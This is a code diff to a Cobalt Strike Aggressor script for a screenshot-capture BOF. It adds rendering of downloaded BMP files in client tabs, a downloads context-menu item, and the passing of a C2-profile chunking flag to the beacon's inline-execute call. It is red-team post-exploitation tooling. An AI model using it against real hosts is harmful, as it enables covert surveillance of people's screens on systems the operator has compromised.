@@ -38,6 +38,38 @@ sub display_image {
 
 }
 
+# This function takes in a screenshot and creates a JLabel to display the screenshot
+sub display_downloaded {
+	local('$screenshot $screenshot_bytes $bid $user $computer $client $MAX_IMAGE_WIDTH $MAX_IMAGE_HEIGHT $bias $image $width $height $icon $scaledIcon $component $tab_name');
+
+	$screenshot_bytes = $1;
+    $file_name = $2;
+
+	$client = getAggressorClient();
+	$MAX_IMAGE_WIDTH = [[[$client getTabManager] getTabbedPane] getWidth];
+	$MAX_IMAGE_HEIGHT = [[[$client getTabManager] getTabbedPane] getHeight];
+
+	$bais = [new ByteArrayInputStream: $screenshot_bytes];
+	$image = [ImageIO read: $bais];
+
+	$width = [$image getWidth];
+	$height = [$image getHeight];
+
+	$icon = [new ImageIcon: $image];
+	if ($width > $MAX_IMAGE_WIDTH) {
+		$width = $MAX_IMAGE_WIDTH;
+	}
+	if ($height > $MAX_IMAGE_HEIGHT) {
+		$height = $MAX_IMAGE_HEIGHT;
+	}
+	$scaledIcon = [new ImageIcon: [$image getScaledInstance: $width, $height, 4]];
+
+	$component = [new JLabel: $scaledIcon];
+	$tab_name = "ScreenshotBOF - $file_name";
+	addTab($tab_name, $component, "...");
+
+}
+
 # Checks the screenshot when it comes in to see if it is a BMP, then if so, renders it in a new tab
 on screenshots {
 	local('$screenshot $data');
@@ -49,6 +81,45 @@ on screenshots {
 	if (charAt($data, 0) eq "B" && charAt($data, 1) eq "M") {
 		display_image($screenshot);
 	}
+}
+
+popup_clear("downloads");
+popup downloads {
+	# do nothing if nothing is selected
+	if (size($1) == 0) {
+		return;
+	}
+
+	item "Interact" {
+		openOrActivate($1[0]["bid"]);
+	}
+
+	menu "&Color" {
+		local('$ids');
+		$ids = map({ return $1["id"]; }, $1);
+		insert_component(colorPanel("accents", $ids));
+	}
+    
+    item "Render &BMP" {
+        local('$download $lpath $name $count');
+   foreach $count => $download ($1) {
+      ($lpath, $name) = values($download, @("lpath", "name"));
+   
+      sync_download($lpath, script_resource("file $+ .$count"), lambda({ 
+         $handle = openf($1);
+         $data = readb($handle, -1);
+         closef($handle);
+         #println(charAt($data, 0));
+         #println(charAt($data, 1));
+         if (charAt($data, 0) eq "B" && charAt($data, 1) eq "M") {
+		    display_downloaded($data, $1);
+	     } else {
+            show_error("File is not a Bitmap image");
+         }
+         deleteFile($1);
+      }, \$name));
+   }
+    }
 }
 
 popup_clear("screenshots");
@@ -107,8 +178,15 @@ alias screenshot_bof {
     $data = readb($handle, -1);
     closef($handle);
     
+    # figure out if the profile chooses to chunk the post or not (getOnlyProfile)
+    $profile = data_query("metadata")["c2profile"];
+    $getOnlyProfile = [$profile shouldChunkPosts];
+    println($getOnlyProfile);
+
+    $args   = bof_pack($bid, "i", $getOnlyProfile);
+
     # announce what we're doing
     btask($bid, "Running screenshot BOF by (@codex_tf2)", "T1113");
     # execute it.
-    beacon_inline_execute($bid, $data, "go");
+    beacon_inline_execute($bid, $data, "go", $args);
 }
